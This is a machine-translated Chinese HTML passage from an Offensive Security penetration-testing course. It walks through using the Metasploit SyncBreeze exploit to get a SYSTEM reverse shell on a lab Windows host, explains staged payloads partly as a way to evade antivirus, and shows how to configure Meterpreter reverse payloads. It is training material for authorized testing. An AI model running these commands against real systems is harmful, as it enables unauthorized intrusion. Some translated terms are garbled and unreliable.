<div style="position:absolute;top:87740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为我们的 Kali IP 地址并将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOST</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为 Windows 主机 IP 地址后，我们可以使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:87760;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以验证目标主机和应用程序是否易受攻击。</font><font style="vertical-align: inherit;">注意这个检查</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅当目标应用程序公开某种横幅或其他可识别数据时才有效。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查</font></font></font></b></nobr></div>
<div style="position:absolute;top:87831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:80 - 目标似乎易受攻击。</font></font></nobr></div>
<div style="position:absolute;top:87850;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 761 - 检查目标是否易受攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确认目标易受攻击后，现在剩下的就是使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:87899;left:109"><nobr><b><font style="vertical-align: inherit;"></font></b><font style="vertical-align: inherit;"><font style="font-size:14px"><font style="vertical-align: inherit;">如下所示的</font></font><b><font style="vertical-align: inherit;">利用</font></b></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:88087;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="75"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 75 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:88120;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:89197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:89197;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:89197;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">692</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:4444 上启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:88232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 自动检测目标...</font></font></nobr></div>
<div style="position:absolute;top:88249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 目标是 10.0.28</font></font></nobr></div>
<div style="position:absolute;top:88266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送请求...</font></font></nobr></div>
<div style="position:absolute;top:88284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*]</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令 shell 会话 1 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:4444 -&gt; 10.11.0.22:50195)</font></font></nobr></div>
<div style="position:absolute;top:88317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.16299.248]</font></font></nobr></div>
<div style="position:absolute;top:88334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2017 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:88368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:88385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></nobr></div>
<div style="position:absolute;top:88402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nt权限\系统</font></font></nobr></div>
<div style="position:absolute;top:88422;left:363"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 762 - 执行漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，当我们执行漏洞利用时，Metasploit 会自动创建一个有效负载侦听器，</font></font></nobr></div>
<div style="position:absolute;top:88470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">消除对 Netcat 的需要。</font><font style="vertical-align: inherit;">执行完成后，会创建一个会话，反之亦然</font></font></nobr></div>
<div style="position:absolute;top:88490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell 可供我们使用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88524;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.2.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用现有的 Metasploit 模块利用 SyncBreeze。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3 Metasploit 有效载荷</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们只利用了 windows/shell_reverse_tcp，一个简单且独立的反向 shell。</font></font></nobr></div>
<div style="position:absolute;top:88652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 包含除基本 shell 之外的许多其他类型的有效载荷。</font><font style="vertical-align: inherit;">让我们来看看一些</font></font></nobr></div>
<div style="position:absolute;top:88672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们现在。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88706;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.1</font></font></i></nobr></div>
<div style="position:absolute;top:88706;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分阶段与非分阶段有效载荷</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在进入特定的 shellcode 功能之前，我们必须讨论</font></font></nobr></div>
<div style="position:absolute;top:88764;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阶段性</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非阶段性</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode，如这两个有效载荷的描述所证明的那样：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/shell </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> reverse_tcp - 连接回攻击者并生成命令外壳</font></font></nobr></div>
<div style="position:absolute;top:88815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/shell </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> reverse_tcp - 连接回攻击者，Spawn cmd shell (staged)</font></font></nobr></div>
<div style="position:absolute;top:88834;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 763 - 暂存和非暂存负载的语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些有效载荷之间的区别很微妙但很重要。</font><font style="vertical-align: inherit;">一个非暂存的有效载荷被发送到它的</font></font></nobr></div>
<div style="position:absolute;top:88883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连同漏洞利用。</font><font style="vertical-align: inherit;">相比之下，分段有效载荷通常分两部分发送。</font><font style="vertical-align: inherit;">首先</font></font></nobr></div>
<div style="position:absolute;top:88903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分包含一个小的主要有效载荷，导致受害机器连接回</font></font></nobr></div>
<div style="position:absolute;top:88922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者，传输包含其余 shellcode 的更大的二级负载，然后执行</font></font></nobr></div>
<div style="position:absolute;top:88942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它。</font></font></nobr></div>
<div style="position:absolute;top:88974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有几种情况我们更愿意使用暂存的 shellcode 而不是非</font></font></nobr></div>
<div style="position:absolute;top:88993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上演。</font><font style="vertical-align: inherit;">如果我们正在利用的漏洞没有足够的缓冲区空间来容纳一个完整的</font></font></nobr></div>
<div style="position:absolute;top:89013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷，分阶段有效载荷可能是合适的。</font><font style="vertical-align: inherit;">由于分段有效载荷的第一部分通常是</font></font></nobr></div>
<div style="position:absolute;top:89032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小于一个完整的有效载荷，这些较小的初始有效载荷可能有助于我们在空间受限的情况下</font></font></nobr></div>
<div style="position:absolute;top:89052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">情况。</font><font style="vertical-align: inherit;">此外，我们需要记住，防病毒软件经常会检测到</font></font></nobr></div>
<div style="position:absolute;top:89071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在漏洞利用中嵌入 shellcode。</font><font style="vertical-align: inherit;">通过用分段有效载荷替换该代码，我们删除了一个好的</font></font></nobr></div>
<div style="position:absolute;top:89090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode 的恶意部分的大块，这可能会增加我们成功的机会。</font><font style="vertical-align: inherit;">之后</font></font></nobr></div>
<div style="position:absolute;top:89110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">初始阶段由漏洞利用执行，剩余的有效载荷被检索并直接注入</font></font></nobr></div>
<div style="position:absolute;top:89129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者机器的内存。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:89275;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="76"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 76 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:89308;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:90385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:90385;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:90385;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">693</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，在 Metasploit 中，“/”字符用于表示有效负载是否已暂存，因此</font></font></nobr></div>
<div style="position:absolute;top:89423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“shell_reverse_tcp”没有暂存，而“shell/reverse_tcp”是。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:89458;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.2</font></font></i></nobr></div>
<div style="position:absolute;top:89458;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 有效载荷</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如 Metasploit 站点所述，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">712</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个多功能有效载荷，可以</font></font></nobr></div>
<div style="position:absolute;top:89515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在运行时动态扩展。</font><font style="vertical-align: inherit;">实际上，这意味着 Meterpreter shell 提供了更多</font></font></nobr></div>
<div style="position:absolute;top:89534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与常规命令外壳相比的特性和功能，提供文件传输等功能，</font></font></nobr></div>
<div style="position:absolute;top:89554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键盘记录，以及与受害者机器交互的各种其他方法。</font><font style="vertical-align: inherit;">这些工具是</font></font></nobr></div>
<div style="position:absolute;top:89573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在后期开发阶段特别有用。</font><font style="vertical-align: inherit;">由于 Meterpreter 的灵活性和能力，</font></font></nobr></div>
<div style="position:absolute;top:89592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它是最受欢迎和最常用的 Metasploit 有效负载。</font></font></nobr></div>
<div style="position:absolute;top:89625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索“meterpreter”关键字会返回一长串结果，但将搜索范围缩小到</font></font></nobr></div>
<div style="position:absolute;top:89644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷类别揭示了多个操作系统和架构的 Meterpreter 版本</font></font></nobr></div>
<div style="position:absolute;top:89664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括 Windows、Linux、Android、Apple iOS、FreeBSD 和 Apple OS X/macOS。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font><b><font color="#0070c0"><font style="vertical-align: inherit;">搜索</font></font></b><font style="vertical-align: inherit;">Meterpreter</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型：有效负载</font></font></font></b></nobr></div>
<div style="position:absolute;top:89733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配模块</font></font></nobr></div>
<div style="position:absolute;top:89749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:89783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">＃ 名称    </font></font></nobr></div>
<div style="position:absolute;top:89783;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
<div style="position:absolute;top:89800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- ----    </font></font></nobr></div>
<div style="position:absolute;top:89800;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------</font></font></nobr></div>
<div style="position:absolute;top:89818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 有效载荷/android/meterpreter/reverse_http    </font></font></nobr></div>
<div style="position:absolute;top:89818;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Android Meterpreter，Android</font></font></nobr></div>
<div style="position:absolute;top:89834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 有效载荷/android/meterpreter/reverse_https    </font></font></nobr></div>
<div style="position:absolute;top:89834;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Android Meterpreter，Android</font></font></nobr></div>
<div style="position:absolute;top:89851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 有效载荷/android/meterpreter/reverse_tcp    </font></font></nobr></div>
<div style="position:absolute;top:89851;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Android Meterpreter，Android</font></font></nobr></div>
<div style="position:absolute;top:89868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 有效载荷/android/meterpreter_reverse_http    </font></font></nobr></div>
<div style="position:absolute;top:89868;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Android Meterpreter Shell，R</font></font></nobr></div>
<div style="position:absolute;top:89885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 有效载荷/android/meterpreter_reverse_https    </font></font></nobr></div>
<div style="position:absolute;top:89885;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Android Meterpreter Shell，R</font></font></nobr></div>
<div style="position:absolute;top:89902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6 有效载荷/android/meterpreter_reverse_tcp    </font></font></nobr></div>
<div style="position:absolute;top:89902;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Android Meterpreter Shell，R</font></font></nobr></div>
<div style="position:absolute;top:89919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7 payload/apple_ios/aarch64/meterpreter_reverse_http Apple_iOS Meterpreter, Rever</font></font></nobr></div>
<div style="position:absolute;top:89936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8 payload/apple_ios/aarch64/meterpreter_reverse_https Apple_iOS Meterpreter, Rever</font></font></nobr></div>
<div style="position:absolute;top:89953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9 payload/apple_ios/aarch64/meterpreter_reverse_tcp Apple_iOS Meterpreter, Rever</font></font></nobr></div>
<div style="position:absolute;top:89970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10 payload/apple_ios/armle/meterpreter_reverse_http Apple_iOS Meterpreter, Rever</font></font></nobr></div>
<div style="position:absolute;top:89987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:90006;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 764 - 搜索 Meterpreter 有效载荷</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有许多基于特定编程语言（Python、</font></font></nobr></div>
<div style="position:absolute;top:90055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHP、Java）、协议和传输（UDP、HTTPS、IPv6 等）以及其他各种规范（32-</font></font></nobr></div>
<div style="position:absolute;top:90074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位与 64 位、分阶段与非分阶段等）。</font></font></nobr></div>
<div style="position:absolute;top:90107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，下面显示了一小部分 Windows 反向 meterpreter 有效负载：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷/windows/meterpreter/reverse_udp 正常反向UDP Stager 与UUID Sup</font></font></nobr></div>
<div style="position:absolute;top:90159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload/windows/meterpreter/reverse_http 普通 Windows 反向 HTTP Stager</font></font></nobr></div>
<div style="position:absolute;top:90176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload/windows/meterpreter/reverse_https 正常 Windows 反向 HTTPS Stager</font></font></nobr></div>
<div style="position:absolute;top:90193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload/windows/meterpreter/reverse_ipv6_tcp normal 反向 TCP Stager (IPv6)</font></font></nobr></div>
<div style="position:absolute;top:90210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload/windows/meterpreter/reverse_tcp normal 反向 TCP Stager</font></font></nobr></div>
<div style="position:absolute;top:90229;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 765 - Meterpreter 反向协议版本</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:90335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">712 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Rapid7，2017），https://github.com/rapid7/metasploit-framework/wiki/Meterpreter</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:90463;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="77"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 77 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:90496;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:91573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:91573;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:91573;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">694</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择特定的 Meterpreter 有效负载</font><font style="vertical-align: inherit;">并像标准一样对其进行配置</font></font></nobr></div>
<div style="position:absolute;top:90611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向外壳有效载荷：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置有效载荷 windows/meterpreter/reverse_ht</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:90663;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tp</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷 =&gt; windows/meterpreter/reverse_http</font></font></nobr></div>
<div style="position:absolute;top:90714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:90731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:90765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:90782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:90816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载选项（windows/meterpreter/reverse_http）：</font></font></nobr></div>
<div style="position:absolute;top:90850;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:90867;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:90883;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出线程    </font></font></nobr></div>
<div style="position:absolute;top:90883;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 退出技术（接受：'', seh, thread, pro</font></font></nobr></div>
<div style="position:absolute;top:90900;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 10.11.0.4    </font></font></nobr></div>
<div style="position:absolute;top:90900;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是本地侦听器主机名</font></font></nobr></div>
<div style="position:absolute;top:90918;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 4444    </font></font></nobr></div>
<div style="position:absolute;top:90918;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 本地监听端口</font></font></nobr></div>
<div style="position:absolute;top:90935;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卢瑞    </font></font></nobr></div>
<div style="position:absolute;top:90935;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:90935;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 路径</font></font></nobr></div>
<div style="position:absolute;top:90968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:90988;left:266"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 766 - 选择 Meterpreter 有效负载和配置选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
